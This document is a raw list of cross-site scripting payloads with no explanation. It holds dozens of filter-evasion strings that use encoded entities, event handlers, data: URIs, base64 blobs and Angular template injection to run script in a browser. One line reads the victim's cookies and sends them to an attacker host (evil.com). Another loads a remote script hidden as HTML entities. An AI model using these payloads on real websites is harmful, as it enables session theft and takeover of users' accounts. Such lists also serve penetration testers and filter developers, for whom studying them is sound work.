<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<img src ?itworksonchrome?\/onerror = alert(1)
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href="//jsfiddle.net/t846h/">click
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
'-confirm`1`-'
<base href=data:/,alert(1)/><script src="jquery.js"></script>
`<b\x20#x (click)="x.inn\x65rHTML='\x3ciframe onload=alert(1)\x3e'">CLICK</b>`
" onmouseover="alert(4321)" blah="
/><input>
<script>({' \ '(){alert(1)}})[` \ `]()</script>
<embed src=URL onload=alert('xss')>
<body onload="'use strict';throw new class extends Function{}('alert(1)')``">
<body onblur=x onload=popup=1;>
<body onerror=popup=1;><svg/onfocus=import> 
<body onload=popup=1;>
<body rel='popup=1;'onerror=popup=1; onload=x >
<button autofocus=x onchange='import'onfocus=popup=1; >
<button data=popup=1; id='x'onfocus=popup=1; >
<button onclick=popup=1;>
<canvas onclick="popup=1;">
<embed onfocus='popup=1;'><img
<form formaction=popup=1; onclick=popup=1;><object>  
<form href='x'onclick=popup=1;><select>
<frameset id="x"onload=popup=1;>
<frameset onload=popup=1;>
<iframe onload=popup=1;>
<img srcset=popup=1; onerror=popup=1;>
<input onclick=popup=1; >
<input onfocus=popup=1; autofocus="x">
<input srcset=x href=x onclick=popup=1; >
<link rel=import href=data:text/html;base64,PHNjcmlwdD5wb3B1cD0xOzwvc2NyaXB0Pg==>  
<object onfocus=popup=1;>
<select onclick="popup=1;">
<select onclick=popup=1;>
<source onclick=popup=1; ><frameset/onload=popup=1;>  
<svg onclick=popup=1;>
<svg onload=popup=1;>
<video onclick=popup=1;>
location='javascript://\u2028alert(1)';
<svg onresize="alert(1)">
<applet/object onerror=alert('XSS')> 
<frameset/onpageshow=alert(1)> 
<div onactivate=alert('Xss') id=xss style=overflow:scroll>
<details open ontoggle=alert(1)>
<svg/onload=setTimeout`alert\`1\``>
%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert(1)%EF%BC%9E 
<select autofocus onfocus=alert`1`
<meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>
\"};with(window){onload=function(){ with(document){k=cookie;};with(window){location='http://evil.com/?a=test'%2bk;};}}//;
<h1 _-_-_-ng_-_-_click="$event.view.location.replace('javascript:alert(1)')">XSS</h1>
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
